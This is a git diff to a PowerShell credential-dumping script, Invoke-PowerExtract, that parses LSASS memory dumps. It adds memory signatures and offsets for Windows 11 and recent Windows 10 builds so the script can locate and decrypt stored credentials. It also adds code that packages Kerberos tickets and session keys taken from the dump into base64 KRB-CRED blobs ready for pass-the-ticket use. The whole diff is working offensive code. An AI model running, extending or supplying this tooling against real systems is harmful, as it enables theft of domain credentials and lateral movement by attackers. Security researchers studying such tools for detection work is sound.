@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
 Invoke-PowerExtract
 
@@ -31,7 +31,8 @@ Function Invoke-PowerExtract
 {
 param(
     $PathToDMP,
-    [boolean]$Debug=$false
+    [boolean]$Debug=$false,
+    [boolean]$GetMeTickets=$false
 )
 
 
@@ -1052,7 +1053,8 @@ $Start = Get-Date
         $WIN_10_1803 = 17134
         $WIN_10_1809 = 17763
         $WIN_10_1903 = 18362
-        
+        $WIN_11_2023 = 22621
+
         $Crypto = New-Object -Type psobject -Property (@{
             "Pattern" = $null
             "IV-Offset" = $null
@@ -1107,7 +1109,7 @@ $Start = Get-Date
                     "key-struct" = $null
                     })
             }
-        elseif(($OSVersion -le $WIN_7) -or ($OSVersion -lt $WIN_8))
+        elseif(($OSVersion -le $WIN_7) -and ($OSVersion -lt $WIN_8))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
@@ -1120,7 +1122,7 @@ $Start = Get-Date
                     "key-struct" = "Get-BCRYPT_KEY"
                     })
             }
-        elseif(($OSVersion -le $WIN_8) -or ($OSVersion -lt $WIN_BLUE))
+        elseif(($OSVersion -le $WIN_8) -and ($OSVersion -lt $WIN_BLUE))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
@@ -1164,7 +1166,7 @@ $Start = Get-Date
                     "key-struct" = "Get-BCRYPT_KEY81"
                     })
             }
-        elseif(($OSVersion -le $WIN_10_1507) -or ($OSVersion -lt $WIN_10_1511))
+        elseif(($OSVersion -le $WIN_10_1507) -and ($OSVersion -lt $WIN_10_1511))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
@@ -1177,7 +1179,7 @@ $Start = Get-Date
                     "key-struct" = "Get-BCRYPT_KEY81"
                     })
             }
-        elseif(($OSVersion -le $WIN_10_1511) -or ($OSVersion -lt $WIN_10_1607))
+        elseif(($OSVersion -le $WIN_10_1511) -and ($OSVersion -lt $WIN_10_1607))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
@@ -1190,7 +1192,7 @@ $Start = Get-Date
                     "key-struct" = "Get-BCRYPT_KEY81"
                     })
             }
-        elseif(($OSVersion -le $WIN_10_1607) -or ($OSVersion -lt $WIN_10_1703))
+        elseif(($OSVersion -le $WIN_10_1607) -and ($OSVersion -lt $WIN_10_1703))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
@@ -1203,7 +1205,7 @@ $Start = Get-Date
                     "key-struct" = "Get-BCRYPT_KEY81"
                     })
             }
-        elseif(($OSVersion -lt $WIN_10_1703) -or ($OSVersion -lt $WIN_10_1709))
+        elseif(($OSVersion -lt $WIN_10_1703) -and ($OSVersion -lt $WIN_10_1709))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
@@ -1216,7 +1218,7 @@ $Start = Get-Date
                     "key-struct" = "Get-BCRYPT_KEY81"
                     })
             }
-        elseif(($OSVersion -le $WIN_10_1709) -or ($OSVersion -lt $WIN_10_1803))
+        elseif(($OSVersion -le $WIN_10_1709) -and ($OSVersion -lt $WIN_10_1803))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
@@ -1230,7 +1232,7 @@ $Start = Get-Date
                     })
                     
             }
-        elseif(($OSVersion -le $WIN_10_1803) -or ($OSVersion -lt $WIN_10_1809))
+        elseif(($OSVersion -le $WIN_10_1803) -and ($OSVersion -lt $WIN_10_1809))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
@@ -1257,7 +1259,7 @@ $Start = Get-Date
                     "key-struct" = "Get-BCRYPT_KEY81"
                     })
             }
-        else
+        elseif(($OSVersion -gt $WIN_10_1809) -and ($OSVersion -lt $WIN_11_2023))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
@@ -1270,6 +1272,19 @@ $Start = Get-Date
                     "key-struct" = "Get-BCRYPT_KEY81"
                     })
         
+            }
+        else
+            {
+                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
+                Write-Debug -Message ("Crypto template identfied and selected")
+                $Crypto = New-Object -Type psobject -Property (@{
+                    "Pattern" = "8364243000488D45E0448B4DD8488D15"
+                    "IV-Offset" = 58
+                    "DES-Offset" = -89
+                    "AES-Offset" = 16
+                    "key-handle" = "Get-BCRYPT_HANDLE_KEY"
+                    "key-struct" = "Get-BCRYPT_KEY81"
+                    })
             }
         return $Crypto
         }
@@ -1298,10 +1313,12 @@ $Start = Get-Date
         $WIN_10_1809 = 17763
         $WIN_10_1903 = 18362
         $WIN_10_21H2 = 19044
+        $WIN_10_22H2 = 19045
+        $WIN_11_2022 = 20348
+        $WIN_11_2023 = 22621
         $Pattern = $null
         $offset_to_FirstEntry = $null
         $offset_to_SessionCounter = $null
-        
         
         if(($OSVersion -le $WIN_XP) -or ($OSVersion -lt $WIN_2K3))
             {
@@ -1489,7 +1506,7 @@ $Start = Get-Date
             $Kerberos_login_session = "Get-KIWI_KERBEROS_LOGON_SESSION_10_1607"
             $kerberos_ticket_struct = "Get-Kerberos_Internal_Ticket_10_1607" 
             }
-        elseif($OSVersion -le $WIN_10_21H2)
+        elseif($OSVersion -le $WIN_10_22H2)
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Credential template identfied and selected")
@@ -1503,7 +1520,8 @@ $Start = Get-Date
             $Kerberos_login_session = "Get-KIWI_KERBEROS_LOGON_SESSION_10_1607"
             $kerberos_ticket_struct = "Get-Kerberos_Internal_Ticket_10_1607"
             }
-        else
+
+        elseif($OSVersion -lt $WIN_11_2022)
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Credential template identfied and selected")
@@ -1517,6 +1535,37 @@ $Start = Get-Date
             $Kerberos_login_session = "Get-KIWI_KERBEROS_LOGON_SESSION_10_1607"
             $kerberos_ticket_struct = "Get-Kerberos_Internal_Ticket_10_1607"
             }
+        elseif($OSVersion -le $WIN_11_2022)
+            {
+                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
+                Write-Debug -Message ("Credential template identfied and selected")
+            $Pattern = "458934244C8BFF8BF34585C074"
+            $offset_to_FirstEntry = 24
+            $offset_to_SessionCounter = -4
+            $ParsingFunction = "Get-MSV1_0_LIST_63"
+            $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"
+            $kerberossignature = "488B18488D0D"
+            $kerberos_offset = 6
+            $Kerberos_login_session = "Get-KIWI_KERBEROS_LOGON_SESSION_10_1607"
+            $kerberos_ticket_struct = "Get-Kerberos_Internal_Ticket_11"
+            }
+
+        else
+            {
+                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
+                Write-Debug -Message ("Credential template identfied and selected")
+            $Pattern = "4589374C8BF78BF34585C00F" 
+            $offset_to_FirstEntry = 27
+            $offset_to_SessionCounter = -4
+            $ParsingFunction = "Get-MSV1_0_LIST_63"
+            $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"
+            $kerberossignature = "488B18488D0D"
+            $kerberos_offset = 6
+            $Kerberos_login_session = "Get-KIWI_KERBEROS_LOGON_SESSION_10_1607"
+            $kerberos_ticket_struct = "Get-Kerberos_Internal_Ticket_11"
+            }
+
+
         
         $MSVTemp = New-Object -Type psobject -Property (@{
             Pattern = $Pattern
@@ -1535,62 +1584,62 @@ $Start = Get-Date
         
     
     function Get-BCRYPT_HANDLE_KEY 
-    {
-    Param(
-        [int64]$InitialPosition,
-        $Dump,
-        $PathToDMP,
-        $keystruct
-    )
-
-
-    $BCRYPT_HANDLE_KEY = New-Object -Type psobject -Property (@{
-        "size" = $null
-        "tag" = $null
-        "halgorithm" = $null
-        "ptr_key" = $null
-        "BCRYPT_KEY" = $null
-        "unk0" = $null
-        })
-
-
-    $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
-    $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
-    $fileReader.BaseStream.Seek($InitialPosition,[System.IO.SeekOrigin]::Begin) | Out-Null
-
-
-    $size =Convert-LitEdian (([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-',''))
-    $tag = Convert-LitEdian (([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-',''))
-    $halgorithm =Convert-LitEdian ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
-    $ptr_key = Convert-LitEdian ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
-
-    if($keystruct -eq "Get-BCRYPT_KEY")
         {
-        $BCRYPT_KEY = Get-BCRYPT_KEY -PathToDMP $PathToDMP -Dump $Dump -InitialPosition (Get-MemoryAddress -MemoryAddress $ptr_key  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position
-        }
-    elseif($keystruct -eq "Get-BCRYPT_KEY8")
-        {
-        $BCRYPT_KEY = Get-BCRYPT_KEY8 -PathToDMP $PathToDMP -Dump $Dump -InitialPosition (Get-MemoryAddress -MemoryAddress $ptr_key  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position
-        }
-    else
-        {
-        $BCRYPT_KEY = Get-BCRYPT_KEY81 -PathToDMP $PathToDMP -Dump $Dump -InitialPosition (Get-MemoryAddress -MemoryAddress $ptr_key  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position
-        }
-    $unk0 = Convert-LitEdian ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        Param(
+            [int64]$InitialPosition,
+            $Dump,
+            $PathToDMP,
+            $keystruct
+        )
+
+
+        $BCRYPT_HANDLE_KEY = New-Object -Type psobject -Property (@{
+            "size" = $null
+            "tag" = $null
+            "halgorithm" = $null
+            "ptr_key" = $null
+            "BCRYPT_KEY" = $null
+            "unk0" = $null
+            })
+
+
+        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
+        $fileReader.BaseStream.Seek($InitialPosition,[System.IO.SeekOrigin]::Begin) | Out-Null
+
+
+        $size =Convert-LitEdian (([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-',''))
+        $tag = Convert-LitEdian (([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-',''))
+        $halgorithm =Convert-LitEdian ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        $ptr_key = Convert-LitEdian ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+
+        if($keystruct -eq "Get-BCRYPT_KEY")
+            {
+            $BCRYPT_KEY = Get-BCRYPT_KEY -PathToDMP $PathToDMP -Dump $Dump -InitialPosition (Get-MemoryAddress -MemoryAddress $ptr_key  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position
+            }
+        elseif($keystruct -eq "Get-BCRYPT_KEY8")
+            {
+            $BCRYPT_KEY = Get-BCRYPT_KEY8 -PathToDMP $PathToDMP -Dump $Dump -InitialPosition (Get-MemoryAddress -MemoryAddress $ptr_key  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position
+            }
+        else
+            {
+            $BCRYPT_KEY = Get-BCRYPT_KEY81 -PathToDMP $PathToDMP -Dump $Dump -InitialPosition (Get-MemoryAddress -MemoryAddress $ptr_key  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position
+            }
+        $unk0 = Convert-LitEdian ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
 
 
 
-    $BCRYPT_HANDLE_KEY = New-Object -Type psobject -Property (@{
-        "size" = $size
-        "tag" = $tag
-        "halgorithm" = $halgorithm
-        "ptr_key" = $ptr_key
-        "BCRYPT_KEY" = $BCRYPT_KEY
-        "unk0" = $unk0
-        })
-    
-    return $BCRYPT_HANDLE_KEY
-    }
+        $BCRYPT_HANDLE_KEY = New-Object -Type psobject -Property (@{
+            "size" = $size
+            "tag" = $tag
+            "halgorithm" = $halgorithm
+            "ptr_key" = $ptr_key
+            "BCRYPT_KEY" = $BCRYPT_KEY
+            "unk0" = $unk0
+            })
+        
+        return $BCRYPT_HANDLE_KEY
+        }
 
 
 
@@ -3708,7 +3757,7 @@ $Start = Get-Date
                 "IsoBlob" = $null
                 })
 
-    #Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        #Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $Username.Position = $fileReader.BaseStream.Position
         $Username.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
         $Username.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
@@ -3741,7 +3790,7 @@ $Start = Get-Date
             $Password.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
             $Password.DataEnc = (Get-MemoryAddress -MemoryAddress $Password.Buffer -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($Password.MaxLength).trim(),16)) -PathToDMP $PathToDMP).Data
 
-            if($Username.Data -match "$")
+            if($Username.Data -like "*$")
                 {
                 $Password.DataDec = Get-DecCreds -DESKey $Crypto.DESKey -IV $Crypto.IV -EncString $Password.DataEnc
                 }
@@ -3834,7 +3883,7 @@ $Start = Get-Date
                 })
 
 
-    #Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        #Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $Username.Position = $fileReader.BaseStream.Position
         $Username.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
         $Username.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
@@ -4527,7 +4576,7 @@ $Start = Get-Date
                         "finaltype" = ""
                         })
 
-        $TicketFlags = ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $TicketFlags = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $unk2 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $KeyType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
 
@@ -4592,7 +4641,126 @@ $Start = Get-Date
                         })
         $Ticket.data = (Get-MemoryAddress -MemoryAddress $Ticket.value.value -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($Ticket.Length).trim(),16)) -PathToDMP $PathToDMP).Data
 
+                $EncryptionKey =          Add-DERTag -Tag 0xA0 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($KeyType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                    Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                    )
+                )
+            )
 
+        $PRealm =     Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+        $PPrincipalname =          Add-DERTag -Tag 0xA2 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                    )
+                )
+            )
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+        #Convert-ByteArrayToHex $PRealm
+
+        $EncServiceNames = $null
+        foreach($ServiceData in $ServiceName.Names.Data )
+            {
+             $EncServiceNames += (Add-DERUtf8String($ServiceData))
+            }
+
+
+        $SPrincipalname = Add-DERTag -Tag 0xA9 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+            )
+        #Convert-ByteArrayToHex $SPrincipalname 
+
+        $TicketInfo = Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                            Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+
+                Add-DERTag -Tag 0xA2 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xA3 -Data @(Add-DERBitString -Data (Convert-HexToByteArray ("00" + $TicketFlags)))
+                #Add-DERTag -Tag 0xA4 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($startTime.value)))
+                Add-DERTag -Tag 0xA5 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($startTime.value)))
+                Add-DERTag -Tag 0xA6 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($endTime.value))) # Generalized time: EndTime
+                Add-DERTag -Tag 0xA7 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($RenewUntil.value))) # Generalized time: RenewTill
+                Add-DERTag -Tag 0xA8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+                Add-DERTag -Tag 0xA9 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(
+                              $EncServiceNames
+                             )
+                            )
+                        )
+                    )
+                )
+
+        $ENCKRBCredPart =  Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0))
+                Add-DERTAG -Tag 0xA2 (Add-DEROctetString (Add-DERTag -Tag 0x7D -Data @( (Add-DERSequence -Data @((Add-DERTag -Tag 0xA0 -data (Add-DERSequence -Data @( $TicketInfo)))) ))))
+                )
+
+        # Ticket
+        $krb5_pvno = 5
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+        $NAME_TYPE_SRV_INST = 02 
+
+        $TSName = Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($NAME_TYPE_SRV_INST))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+        $ETicket = Add-DERSequence -Data @(
+               Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+               Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($TicketKvno))
+               Add-DERTag -Tag 0xA2 -Data @(Add-DEROctetString (Convert-HexToByteArray $Ticket.Data))   
+               )
+
+        # Final Ticket
+        $TicketFull = Add-DERTag -Tag 0x61 -Data @( Add-DERSequence -Data @(
+                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($krb5_pvno))
+                    Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $DomainName.Data)
+                    Add-DERTag -Tag 0xA2 -Data @( $TSName)
+                    Add-DERTag -Tag 0xA3 -Data @($ETicket )
+                    ))
+        $pvno = 05
+        $MSG_KRB_CRED = 22
+       
+        $TheTicket =  Add-DERTag -Tag 0x76 -Data @(
+            Add-DERSequence -Data @(
+            Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($pvno))
+            Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($MSG_KRB_CRED))
+            Add-DERTAG -Tag 0xA2 (Add-DERSequence -Data @($TicketFull)) 
+            Add-DERTAG -Tag 0xA3 ($ENCKRBCredPart)   
+        ))
+
+        $TicketB64 = ([System.Convert]::ToBase64String($TheTicket)) 
 
         $Kerberos_internal_ticket = New-Object -Type psobject -Property (@{
 		    "Flink" = $Flink
@@ -4626,6 +4794,8 @@ $Start = Get-Date
 		    "TicketEncType" = $TicketEncType
 		    "TicketKvno" = $TicketKvno
 		    "Ticket" = $Ticket
+            "TicketType" = $Type
+            "TicketB64" = $TicketB64 
             })
         return $Kerberos_internal_ticket
         }
@@ -4794,7 +4964,7 @@ $Start = Get-Date
                         "finaltype" = ""
                         })
 
-        $TicketFlags = ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $TicketFlags = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $unk2 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $KeyType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
@@ -4862,6 +5032,125 @@ $Start = Get-Date
                         })
         $Ticket.data = (Get-MemoryAddress -MemoryAddress $Ticket.value.value -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($Ticket.Length).trim(),16)) -PathToDMP $PathToDMP).Data
 
+        $EncryptionKey = Add-DERTag -Tag 0xA0 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($KeyType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                    Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                    )
+                )
+            )
+
+        $PRealm = Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+        $PPrincipalname =          Add-DERTag -Tag 0xA2 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                    )
+                )
+            )
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+
+        $EncServiceNames = $null
+        foreach($ServiceData in $ServiceName.Names.Data )
+            {
+             $EncServiceNames += (Add-DERUtf8String($ServiceData))
+            }
+
+
+        $SPrincipalname = Add-DERTag -Tag 0xA9 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+            )
+
+        $TicketInfo = Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                            Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+
+                Add-DERTag -Tag 0xA2 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xA3 -Data @(Add-DERBitString -Data (Convert-HexToByteArray ("00" + $TicketFlags)))
+                Add-DERTag -Tag 0xA5 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($startTime.value)))
+                Add-DERTag -Tag 0xA6 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($endTime.value))) # Generalized time: EndTime
+                Add-DERTag -Tag 0xA7 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($RenewUntil.value))) # Generalized time: RenewTill
+                Add-DERTag -Tag 0xA8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+                Add-DERTag -Tag 0xA9 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(
+                              $EncServiceNames
+                             )
+                            )
+                        )
+                    )
+                )
+
+        $ENCKRBCredPart =  Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0))
+                Add-DERTAG -Tag 0xA2 (Add-DEROctetString (Add-DERTag -Tag 0x7D -Data @( (Add-DERSequence -Data @((Add-DERTag -Tag 0xA0 -data (Add-DERSequence -Data @( $TicketInfo)))) ))))
+                )
+
+        # Ticket
+        $krb5_pvno = 5
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+        $NAME_TYPE_SRV_INST = 02 
+
+        $TSName = Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($NAME_TYPE_SRV_INST))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+        $ETicket = Add-DERSequence -Data @(
+               Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+               Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($TicketKvno))
+               Add-DERTag -Tag 0xA2 -Data @(Add-DEROctetString (Convert-HexToByteArray $Ticket.Data))   
+               )
+
+        # Final Ticket
+        $TicketFull = Add-DERTag -Tag 0x61 -Data @( Add-DERSequence -Data @(
+                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($krb5_pvno))
+                    Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $DomainName.Data)
+                    Add-DERTag -Tag 0xA2 -Data @( $TSName)
+                    Add-DERTag -Tag 0xA3 -Data @($ETicket )
+                    ))
+        $pvno = 05
+        $MSG_KRB_CRED = 22
+       
+        $TheTicket =  Add-DERTag -Tag 0x76 -Data @(
+            Add-DERSequence -Data @(
+            Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($pvno))
+            Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($MSG_KRB_CRED))
+            Add-DERTAG -Tag 0xA2 (Add-DERSequence -Data @($TicketFull)) 
+            Add-DERTAG -Tag 0xA3 ($ENCKRBCredPart)   
+        ))
+
+        $TicketB64 = ([System.Convert]::ToBase64String($TheTicket)) 
+
+
         $Kerberos_internal_ticket = New-Object -Type psobject -Property (@{
 		    "Flink" = $Flink
 		    "Blink" = $Blink
@@ -4895,6 +5184,8 @@ $Start = Get-Date
 		    "TicketEncType" = $TicketEncType
 		    "TicketKvno" = $TicketKvno
 		    "Ticket" = $Ticket
+            "TicketType" = $Type
+            "TicketB64" = $TicketB64 
             })
         return $Kerberos_internal_ticket
         }
@@ -5056,7 +5347,7 @@ $Start = Get-Date
                         "finaltype" = ""
                         })
 
-        $TicketFlags = ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $TicketFlags = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $unk2 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $KeyType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
@@ -5127,7 +5418,126 @@ $Start = Get-Date
                         })
         $Ticket.data = (Get-MemoryAddress -MemoryAddress $Ticket.value.value -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($Ticket.Length).trim(),16)) -PathToDMP $PathToDMP).Data
 
+                $EncryptionKey =          Add-DERTag -Tag 0xA0 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($KeyType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                    Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                    )
+                )
+            )
 
